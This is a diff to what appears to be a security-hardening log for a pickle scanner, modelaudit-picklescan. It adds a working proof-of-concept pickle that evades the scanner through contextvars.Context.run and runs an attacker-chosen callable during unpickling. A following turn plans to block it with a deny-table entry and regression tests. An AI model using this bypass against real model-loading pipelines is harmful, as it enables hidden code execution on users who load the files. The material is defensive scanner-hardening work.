@@ -1889,3 +1889,98 @@ Blocking plan:
 Performance note: the fix adds three tuples to a sorted static table checked
 with binary search. It does not add process-pool state modeling, future
 tracking, or broader asynchronous callback-flow analysis.
+
+## Turn 45 - `contextvars.Context.run` arbitrary-callback gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using a synchronous callback
+runner outside the already blocked executor/scheduler families.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_contextvars_context_run_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("contextvars", "Context"),
+        b")R\x940",
+        sg("contextvars", "Context.run"),
+        b"(",
+        b"h\x00",
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_contextvars_context_run_marker"),
+        b"tR",
+        b"tR.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=151`, `bytes_total=151`, `opcode_count=28`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `contextvars.Context`,
+  `contextvars.Context.run`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_contextvars_context_run_marker` before
+  `pickle.loads()` returns and returns `None`
+- RCE mechanism: the pickle constructs a fresh `contextvars.Context()`,
+  memoizes it, pops the construction result to keep the stack tidy, then calls
+  `Context.run(context, pathlib.Path.touch, marker)`. `Context.run` executes
+  the attacker-selected callable synchronously with attacker-controlled
+  arguments during deserialization.
+
+Why the scanner missed it:
+
+- `contextvars` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `contextvars.Context`,
+  `contextvars.Context.run`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+- The dangerous callback is passed as an argument to a clean-looking descriptor
+  method; the scanner only flags the outer `REDUCE` callable if that outer
+  callable is already policy-listed.
+
+Performance note: this is a compact synchronous callback-dispatch sink. The
+focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
+`("contextvars", "Context.run")`, plus a manual-pickle oracle regression for
+the memoized `Context` proof. The hot path remains static policy lookup.
+
+## Turn 46 - Block `contextvars.Context.run` callbacks
+
+Blocking plan:
+
+- Add `("contextvars", "Context.run")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. `contextvars.Context` itself stays allowed because
+  it only creates an execution context; `Context.run` is the arbitrary-callback
+  dispatcher that invokes attacker-selected callables synchronously.
+- Add portable policy coverage for a raw `contextvars.Context.run` reduction
+  so detection does not depend on the specific manual oracle shape.
+- Add a CPython oracle regression that manually builds the memoized
+  `Context.run(context, pathlib.Path.touch, marker)` payload, verifies scanner
+  detection for `Context.run`, then proves the callback creates the marker
+  during `pickle.loads()`.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add callback-flow tracking, context object state
+modeling, or descriptor-specific execution simulation.
